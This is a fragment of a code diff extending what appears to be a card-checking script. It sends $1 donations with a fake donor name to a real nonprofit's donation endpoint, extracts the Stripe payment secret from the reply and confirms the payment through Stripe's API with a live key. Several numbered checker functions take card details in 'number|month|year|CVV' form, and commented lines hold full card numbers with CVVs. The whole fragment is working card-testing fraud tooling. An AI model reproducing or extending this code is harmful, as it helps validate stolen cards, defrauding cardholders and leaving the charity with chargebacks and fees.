+            'donation_amount': 'custom',
+            'custom_donation_amount': '1.00',
+            'first_name': 'Gen',
+            'last_name': 'Paypal',
+            'email': email,
+            'address': '',
+            'address_2': '',
+            'city': '',
+            'state': '',
+            'postcode': '',
+            'country': 'US',
+            'phone': '',
+            'gateway': 'stripe',
+            'square_token': 'cnon:CA4SEGvGGXD7zjt8mOr9wu0lChEYASgC',
+            'square_verification_token': '',
+            'stripe_payment_method': f'{pm}',
+            'action': 'make_donation',
+            'form_action': 'make_donation',
+        }
+        
+        response = requests.post('https://letussoar.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
+        if "secret" in response.text:
+            print("✅ req3 required. Continue with next step...")
+            response_str = response.text
+            response = json.loads(response_str)
+            secret = response.get("secret")
+            pattern = r"^(pi_[a-zA-Z0-9]+)_secret_[a-zA-Z0-9]+$"
+            match = re.match(pattern, secret)
+            if match:
+            	full_secret = secret
+            	prefix = match.group(1)
+            	print("Full secret:", full_secret)
+            	print("Prefix:", prefix)
+            else:
+            	print("No match found")
+            	
+            #4
+            headers = {
+    'authority': 'api.stripe.com',
+    'accept': 'application/json',
+    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
+    'cache-control': 'no-cache',
+    'content-type': 'application/x-www-form-urlencoded',
+    'origin': 'https://js.stripe.com',
+    'pragma': 'no-cache',
+    'referer': 'https://js.stripe.com/',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-site',
+    'user-agent': user,
+            }
+            data = {
+    'expected_payment_method_type': 'card',
+    'use_stripe_sdk': 'true',
+    'key': 'pk_live_51Sb1OURfyggrecD8Y2FDk7kLjEeRAKFOjOVc5EGLXRZls2kOsp2ZjwwQtqmeC1064HhkbLAI1lobneWyiaW4TsFI00p37S47fA',
     'client_secret': full_secret,
             }
             response = requests.post(
@@ -2938,7 +3315,7 @@ def go14(cc_input: str) -> str:
     except Exception as e:
         print(f"Error occurred: {e}")
 #================================        
-#test_card = "4441114465823639|05|2029|839"
+#test_card = "5178057998269695|04|2029|007"
 #print(go0(test_card))
 #print(go1(test_card))
 #print(go2(test_card))
@@ -2954,3 +3331,5 @@ def go14(cc_input: str) -> str:
 #print(go12(test_card))
 #print(go13(test_card))
 #print(go14(test_card))
+#print(go15(test_card))
+#print(go16(test_card))
